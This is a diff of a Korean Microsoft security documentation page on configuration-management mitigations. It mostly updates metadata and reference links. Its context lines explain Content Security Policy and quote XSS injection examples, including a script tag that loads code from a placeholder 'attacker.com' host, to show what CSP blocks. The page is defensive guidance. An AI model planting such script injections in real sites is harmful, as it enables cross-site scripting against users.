@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 08/17/2017
 ms.author: rodsan
-ms.openlocfilehash: cea96234083abd01cdf280129e6f75a1f69af9c6
-ms.sourcegitcommit: 150a40d8ba2beaf9e22b6feff414f8298a8ef868
+ms.openlocfilehash: 5b9ef9691d3d9b9aaced3ad2aaa54e6cfc03fa14
+ms.sourcegitcommit: 0b4da003fc0063c6232f795d6b67fa8101695b61
 ms.translationtype: HT
 ms.contentlocale: ko-KR
-ms.lasthandoff: 06/27/2018
-ms.locfileid: "37028985"
+ms.lasthandoff: 07/05/2018
+ms.locfileid: "37857449"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>보안 프레임: 구성 관리 | 완화 
 | 제품/서비스 | 문서 |
@@ -42,7 +42,7 @@ ms.locfileid: "37028985"
 | **SDL 단계**               | 빌드 |  
 | **적용 가능한 기술** | 일반 |
 | **특성**              | 해당 없음  |
-| **참조**              | [CPS(콘텐츠 보안 정책) 소개](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)(영문), [콘텐츠 보안 정책 참조](http://content-security-policy.com/)(영문), [보안 기능](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)(영문), [콘텐츠 보안 정책 소개](https://docs.webplatform.org/wiki/tutorials/content-security-policy)(영문), [CSP를 사용할 수 있습니까?](http://caniuse.com/#feat=contentsecuritypolicy)(영문) |
+| **참조**              | [CPS(콘텐츠 보안 정책) 소개](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)(영문), [콘텐츠 보안 정책 참조](http://content-security-policy.com/)(영문), [보안 기능](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)(영문), [콘텐츠 보안 정책 소개](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)(영문), [CSP를 사용할 수 있습니까?](http://caniuse.com/#feat=contentsecuritypolicy)(영문) |
 | **단계** | <p>CSP(콘텐츠 보안 정책)는 웹 응용 프로그램 소유자가 자신의 사이트에 포함된 콘텐츠를 제어할 수 있게 하는 심층 방어 보안 메커니즘인 W3C 표준입니다. CSP는 웹 서버에 HTTP 응답 헤더로 추가되며 브라우저에서 클라이언트 쪽에 적용됩니다. 허용 목록 기반 정책이며, 웹 사이트에서 JavaScript와 같은 액티브 콘텐츠를 로드할 수 있는 트러스트된 도메인 집합을 선언할 수 있습니다.</p><p>CSP는 다음과 같은 보안 이점을 제공합니다.</p><ul><li>**XSS에 대한 보호:** 페이지가 XSS에 취약한 경우 공격자는 다음 두 가지 방법으로 이를 악용할 수 있습니다.<ul><li>`<script>malicious code</script>`를 삽입합니다. 이 악용은 CSP의 기본 제한-1로 인해 작동하지 않습니다.</li><li>`<script src=”http://attacker.com/maliciousCode.js”/>`를 삽입합니다. 공격자가 제어하는 도메인은 CSP의 도메인 허용 목록에 없으므로 이 악용은 작동하지 않습니다.</li></ul></li><li>**데이터 유출 제어:** 웹 페이지의 악성 콘텐츠가 외부 웹 사이트에 연결하여 데이터를 도용하려고 하면 CSP에서 연결을 중단합니다. 이는 대상 도메인이 CSP의 허용 목록에 없기 때문입니다.</li><li>**클릭재킹에 대한 방어:** 클릭재킹은 악의적 사용자가 실제 웹 사이트를 구성하고 사용자가 UI 요소를 클릭하도록 강요하는 공격 기법입니다. 현재 클릭재킹에 대한 방어는 X-Frame-Options 응답 헤더를 구성하여 수행됩니다. 모든 브라우저에서 이 헤더를 사용하지는 않으며, CSP가 클릭재킹을 방어하기 위한 표준 방법이 됩니다.</li><li>**실시간 공격보고:** CSP 지원 웹 사이트에 대한 삽입 공격이 있는 경우 브라우저에서 자동으로 웹 서버에 구성된 끝점으로 알림을 트리거합니다. CSP는 이러한 방식으로 실시간 경고 시스템의 역할을 수행합니다.</li></ul> |
 
 ### <a name="example"></a>예
@@ -562,7 +562,7 @@ EnableCors 특성의 원본 목록이 유한하고 신뢰할 수 있는 원본 �
 | **SDL 단계**               | 빌드 |  
 | **적용 가능한 기술** | 일반 |
 | **특성**              | 게이트웨이 선택 - Azure IoT Hub |
-| **참조**              | [IoT Hub 장치 관리 개요](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [장치 펌웨어를 업데이트하는 방법](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
+| **참조**              | [IoT Hub 장치 관리 개요](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [장치 펌웨어를 업데이트하는 방법](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
 | **단계** | LWM2M은 IoT 장치 관리를 위한 Open Mobile Alliance의 프로토콜입니다. Azure IoT 장치 관리를 통해 장치 작업을 사용하여 물리적 장치와 상호 작용할 수 있습니다. 클라우드 게이트웨이에서 Azure IoT Hub 장치 관리를 사용하여 정기적으로 장치 및 기타 구성 데이터를 최신 상태로 유지하는 프로세스를 구현하는지 확인합니다. |
 
 ## <a id="controls-policies"></a>장치에서 조직 정책에 따라 구성된 끝점 보안 제어를 사용하는지 확인
@@ -607,7 +607,8 @@ EnableCors 특성의 원본 목록이 유한하고 신뢰할 수 있는 원본 �
 | **적용 가능한 기술** | .NET Framework 3 |
 | **특성**              | 해당 없음  |
 | **참조**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify, 영국](https://vulncat.fortify.com/en/vulncat/index.html) |
-| **단계** | <p>시스템 리소스 사용을 제한하지 않으면 리소스가 모두 소모되고 최종적으로 서비스가 거부될 수 있습니다.</p><ul><li>**설명:** WCF(Windows Communication Foundation)는 서비스 요청을 제한할 수 있습니다. 클라이언트 요청을 너무 많이 허용하면 시스템이 과도하게 작동되며 해당 리소스가 모두 소모될 수 있습니다. 반면에 약간의 서비스 요청만 허용하면 합법적인 사용자가 서비스를 사용할 수 없도록 방해할 수 있습니다. 각 서비스는 개별적으로 조정되어 적절한 양의 리소스를 허용하도록 구성해야 합니다.</li><li>**권장 사항:** WCF의 서비스 제한 기능을 사용하도록 설정하고 응용 프로그램에 적합한 제한을 설정합니다.</li></ul>|
+| **단계** | <p>시스템 리소스 사용을 제한하지 않으면 리소스가 모두 소모되고 최종적으로 서비스가 거부될 수 있습니다.</p><ul><li>
+  **설명:** WCF(Windows Communication Foundation)는 서비스 요청을 제한할 수 있습니다. 클라이언트 요청을 너무 많이 허용하면 시스템이 과도하게 작동되며 해당 리소스가 모두 소모될 수 있습니다. 반면에 약간의 서비스 요청만 허용하면 합법적인 사용자가 서비스를 사용할 수 없도록 방해할 수 있습니다. 각 서비스는 개별적으로 조정되어 적절한 양의 리소스를 허용하도록 구성해야 합니다.</li><li>**권장 사항:** WCF의 서비스 제한 기능을 사용하도록 설정하고 응용 프로그램에 적합한 제한을 설정합니다.</li></ul>|
 
 ### <a name="example"></a>예
 다음은 제한을 사용하도록 설정된 예제 구성입니다.
